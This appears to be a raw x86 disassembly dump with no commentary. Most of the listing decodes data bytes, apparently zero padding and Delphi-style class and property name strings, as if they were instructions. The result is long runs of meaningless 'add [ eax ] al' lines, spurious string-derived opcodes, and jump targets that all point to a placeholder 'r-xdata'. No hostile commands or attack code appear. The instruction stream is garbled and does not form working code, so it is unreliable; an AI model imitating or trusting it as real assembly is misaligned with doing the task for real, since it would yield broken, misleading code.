add al al
mov al 0x48
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x70004481 ] ah
mov cl 0x48
add [ eax + esi * 4 + 0x48 ] cl
add [ eax - 0x50 ] cl
dec eax
add [ eax ] bl
scasd [ edi ]
dec eax
add [ eax ] ah
mov cl 0x48
scasb [ edi ]
dec eax
add [ eax + esi * 4 + 0x48 ] ah
add [ eax - 0x50 ] ch
dec eax
add [ eax - 0x50 ] dh
dec eax
add [ 0x61724454 ] cl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
nop
nop
shl [ ebx + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jae r-xdata
add al dh
outsd
insb
jae r-xdata
outsd
insb
jae r-xdata
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xa0004481
add [ eax + eax - 0x18 ] 0x4c0048ae
mov al 0x48
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
jne r-xdata
popad
insb
imul esp [ ebp + 0x6e ] 0x6c610874
jb r-xdata
add [ esp + esi * 2 + r-xdata ] bh
add [ eax ] al
push 0x6c004873
add [ eax + eax + 0x74 ] 0x82
inc esp
inc esp
jb r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al dl
mov al 0x48
add al ah
mov al 0x48
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x17ffbb7f ] ah
scasb [ edi ]
dec eax
add [ eax + esi * 4 + 0x48 ] cl
add [ eax - 0x50 ] cl
dec eax
add [ eax ] bl
scasd [ edi ]
dec eax
add [ eax - 0xfffb752 ] dl
add [ eax + 0x48733490 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x73 ] bl
dec eax
add [ eax + eax ] al
add [ edx + esi * 2 ] ch
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
je r-xdata
add [ eax - 0x50 ] cl
nop
nop
test [ edx + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44004872 ] ch
add [ eax ] al
add [ eax + 0x7fffffff ] al
add [ eax ] al
nop
nop
mov ah 0x71
dec eax
add [ esi ] cl
or [ eax + ecx * 2 + 0x69 ] edx
outsb
inc esp
inc ebx
outsd
outsb
je r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax ] al
mov esp 0x4c004874
add [ eax ] al
add [ eax + 0x73 ] ch
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax ] bh
add [ eax ] al
add [ eax + r-xdata ] dl
add eax [ esi ]
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add al dl
jno r-xdata
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + esi * 4 + 0x48 ] dh
add [ eax - 0x4f ] dh
dec eax
add al ch
mov bl 0x48
add [ eax - 0x50 ] cl
dec eax
add [ eax ] bl
inc ebx
outsd
outsb
je r-xdata
mov cl 0x48
add al dh
scasb [ edi ]
dec eax
add al cl
mov cl 0x48
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x28 ] si
jne r-xdata
mov al 0x48
add al al
mov al 0x48
test [ eax + eax + 0x44 ] al
test [ eax + eax - 0x30 ] al
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x8 ] si
je r-xdata
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al dl
mov al 0x48
add al al
mov al 0x48
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x17ffbb7f ] ah
scasb [ edi ]
dec eax
add [ eax + esi * 4 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x72
dec eax
add [ eax + eax ] al
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
dec eax
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx + 0x76 ] si
dec eax
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 + 0x75 ] si
dec eax
add [ esp + esi * 2 ] al
dec eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
scasd [ edi ]
dec eax
add [ edx + esi * 4 - 0x510fffb8 ] ah
dec eax
add [ eax + esi * 4 + 0x48 ] ah
add [ eax - 0x50 ] ch
dec eax
add [ eax - 0x50 ] dh
dec eax
add [ ebx + esi * 4 ] al
dec eax
add [ edx + esi * 4 ] cl
dec eax
add [ ebx + esi * 4 + 0x48 ] al
add al al
mov bl 0x48
add ah dl
mov bl 0x48
add al bh
mov bl 0x48
add ah dh
mov bl 0x48
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
nop
nop
nop
les esi [ ebp + 0x48 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] al
dec eax
add [ eax + eax ] bh
add [ eax + 0x73 ] ch
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al dl
mov al 0x48
add al al
mov al 0x48
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
add [ eax + 0x70004481 ] ah
mov cl 0x48
add [ ecx + esi * 4 - 0x4e43ffb8 ] ah
dec eax
add [ eax ] bl
scasd [ edi ]
dec eax
add [ eax ] ah
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x48 ] dl
add [ eax + eax ] cl
add [ eax ] bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
nop
nop
inc esp
ja r-xdata
dec eax
add [ eax + esi * 4 + 0x48 ] ah
add [ eax - 0x50 ] ch
dec eax
add [ eax - 0x50 ] dh
dec eax
add [ ebx + esi * 4 ] al
dec eax
add [ edx + esi * 4 ] cl
dec eax
add [ ebx + esi * 4 + 0x48 ] al
add al al
mov bl 0x48
add ah dl
mov bl 0x48
add al bh
mov bl 0x48
add ah dh
mov bl 0x48
add [ ecx ] dl
push esp
inc esp
jb r-xdata
add al dh
scasb [ edi ]
outsd
insb
jae r-xdata
add [ eax - 0x50 ] ch
dec eax
add al ch
mov cl 0x48
add [ ecx + esi * 4 + 0x48 ] cl
add ah ah
mov al 0x48
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al dl
mov al 0x48
add [ eax ] cl
mov dl 0x48
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
shl [ eax - 0x4f3fffb8 ] 0x1
dec eax
inc esp
jb r-xdata
add [ eax ] ch
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x48 ] bl
add [ eax + eax ] ch
add al cl
mov esp 0x826c0046
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax + 0x48769890 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jbe r-xdata
add al dl
inc ebx
outsd
outsb
je r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al dl
mov al 0x48
add [ eax ] al
mov ah 0x48
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + esi * 4 + 0x48 ] dh
add [ eax - 0x4f ] dh
dec eax
add al ch
mov bl 0x48
add [ eax - 0x50 ] cl
dec eax
add [ eax ] bl
scasd [ edi ]
dec eax
add [ edx + esi * 4 - 0x510fffb8 ] ah
add [ eax + eax ] bh
add [ ebp + esi * 2 + 0x48 ] ch
add [ eax + 0x70004481 ] ah
mov cl 0x48
add [ ecx + esi * 4 - 0x4e43ffb8 ] ah
dec eax
add [ eax ] bl
scasd [ edi ]
dec eax
add [ eax ] ah
mov cl 0x48
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 8 + 0x73 ] si
dec eax
add [ edx + esi * 2 + 0x48 ] dh
or [ ebx + 0x6f ] al
outsb
je r-xdata
add al dh
scasb [ edi ]
dec eax
add al cl
mov cl 0x48
add [ eax - 0x50 ] ch
dec eax
add al ch
mov cl 0x48
add [ ecx + esi * 4 + 0x48 ] cl
add ah ah
mov al 0x48
add [ edx ] dl
push esp
inc esp
jb r-xdata
dec eax
outsd
insb
jae r-xdata
add [ eax + 0x74909090 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4877d6
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + 0x155c0045 ] al
inc ebp
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add al bh
out 0x42 al
add [ eax - 0x14 ] cl
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax + 0x8004514 ] dh
in eax dx
inc edx
add [ esp + ebp * 8 - 0x13bfffbe ] ch
inc edx
add [ eax - 0x14 ] dh
inc edx
add [ esp + ebp * 8 + 0x42 ] al
add [ eax + 0xf ] al
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_4878ff
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add ah cl
adc eax [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
or [ eax * 2 + 0x48cc1000 ] dl
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
sub_487ba0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + ecx * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + ecx * 2 ] bh
and al 0x0
add [ eax ] al
aam 0x1c
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 - 0x384fffbe ] dl
dec eax
add [ eax - 0x3fffbdb2 ] bl
dec ebp
inc edx
add [ eax + ecx * 8 - 0x388bffb8 ] al
dec eax
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] 0x90909073
and [ eax + ecx * 2 ] bh
pop es
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
clc
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc edx
add al dl
imul ebp [ esi + 0x53 ] 0x5657a69
add [ eax ] al
add [ eax ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7d ] bh
dec eax
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x487b7c74
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7d ] ch
dec eax
add [ eax + eax ] ah
add [ eax ] al
aam 0x1c
inc edx
add [ edx + eax * 4 + 0x44 ] ch
dec eax
jpo r-xdata
imul ebp [ esi + 0x74 ] 0x487bf473
add [ ebp + ebx + 0x42 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jl r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + eax ] dl
add bh bh
clc
dec eax
outsd
insb
jae r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 - 0x392fffbe ] dl
dec ecx
add [ eax - 0x3fffbdb2 ] bl
dec ebp
inc edx
add [ eax ] bl
add [ ecx ] al
or edx [ ebp + ecx * 2 + 0x61 ]
add [ eax ] cl
add [ eax ] al
add [ ebx + edi * 2 + 0x48 ] bh
sub_487dfe
dec ecx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
inc edx
outsd
je r-xdata
add [ esi + eax * 8 + 0x54080049 ] cl
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0x9c909090
outsd
insd
nop
nop
nop
jo r-xdata
add [ edi ] al
or [ eax + edx * 2 + 0x61 ] dl
imul ebp [ fs : esi + 0x67 ] r-xdata
je r-xdata
jle r-xdata
pushfd
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
dec eax
add [ eax + eax ] al
or [ ebx + 0x6f ] al
push esi
inc esp
outsd
insd
nop
nop
nop
inc eax
jg r-xdata
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
pop es
or [ esi ] al
push ebx
outsb
jb r-xdata
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] cl
add [ eax ] al
dec [ edi + eax * 8 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al bl
jl r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
popad
je r-xdata
inc ebp
jbe r-xdata
je r-xdata
jb r-xdata
jne r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
outsb
je r-xdata
jl r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x68676952
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
push 0xb746669
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ eax + 0x487fb890 ] dl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
inc esp
outsb
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax + eax ] cl
add bh bh
dec esp
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
jl r-xdata
push esi
add [ eax - 0x7f2b6f70 ] dl
insb
adc al 0x42
outsb
or al 0x54
dec ebp
outsd
or eax 0x73756f4d
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jns r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add al 0x4c
jl r-xdata
je r-xdata
add [ eax + eax ] dl
add bh bh
dec esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
or [ esi ] cl
push esp
dec ebx
jns r-xdata
jbe r-xdata
add [ esi + edx * 2 + 0x44 ] ch
inc edx
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax + r-xdata ] dl
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : eax + 0x57 ] al
push cs
push esp
dec ebp
outsd
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec eax
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
aam 0x80
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
push ebx
jb r-xdata
add [ esi + edx * 2 + 0x44 ] ch
inc eax
push edi
inc esp
add [ ecx + edi * 2 + 0x146c0048 ] cl
inc edx
add [ esi + edx * 2 + 0x44 ] ch
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
jne r-xdata
dec ebp
outsd
je r-xdata
add [ eax ] dl
add [ eax ] al
dec [ edi + eax * 8 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
arpl [ eax + eax + 0x5 ] si
outsd
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ ebx ] eax
outsb
je r-xdata
int3
je r-xdata
jb r-xdata
inc esp
add [ eax + 0x6c004456 ] bl
adc al 0x42
add [ eax + 0x57 ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ ecx ] al
push esp
push ebx
dec ebp
outsd
jne r-xdata
je r-xdata
jns r-xdata
jb r-xdata
inc eax
push edi
inc esp
add [ esp + edx + 0x42 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ eax - 0x7fe36f70 ] dl
dec eax
add [ eax ] cl
adc edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
push ebx
push 0xb746669
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
je r-xdata
inc edx
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ eax + 0x57 ] al
inc esp
add [ eax + 0x56 ] al
inc esp
add [ eax - 0x7ea36f70 ] dl
dec eax
add [ eax ] cl
push cs
push esp
inc ebx
push 0x40007261
push edi
add ecx [ eax ]
push es
add ah cl
push esi
inc esp
outsb
add [ 0x66696853 ] al
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
inc esp
add [ esp + edx + 0x42 ] ch
add [ eax + 0x57 ] al
inc esp
add [ ecx + edi * 2 + 0x146c0048 ] cl
inc edx
jne r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
dec edi
bound ebp [ edx + 0x65 ]
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
push 0x53746669
je r-xdata
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ eax + 0x57 ] al
dec edi
jbe r-xdata
add [ ebx ] eax
dec ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
push esp
push ebx
push 0x53746669
push ebx
outsb
jb r-xdata
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
inc eax
add [ edx + esi * 2 - 0x7d73ffb8 ] dh
dec eax
add [ eax ] cl
or eax 0x646e4554
inc esp
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc esp
add [ esi + edx * 2 + 0x44 ] ch
inc eax
push edi
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
pop es
dec eax
imul esi [ esp + edx * 2 + 0x65 ] 0x49077473
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
je r-xdata
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
inc esp
jb r-xdata
jns r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
insb
push esi
inc esp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
add [ esi + edx * 2 + 0x44 ] ch
add [ eax + 0x7a ] bh
dec eax
add [ eax ] bl
push esi
inc esp
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
insb
push esi
inc esp
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ esi + edx * 2 + 0x44 ] ch
add [ eax - 0x7dbb6f70 ] dl
dec eax
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc eax
push edi
inc esp
add [ eax + 0x57 ] al
inc esp
add [ esi + edx * 2 + 0x44 ] ch
push edi
pop es
inc edx
outsd
outsd
insb
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
push edi
push edi
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x40 ] si
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
inc eax
push edi
inc esp
add [ esi + esi * 2 ] dl
dec eax
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ eax - 0x7caf6f70 ] dl
dec eax
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add al ch
or [ eax ] 0x8
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc eax
push edi
inc esp
add [ eax + 0x57 ] al
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
outsb
je r-xdata
popad
outsb
add [ eax + 0x57 ] al
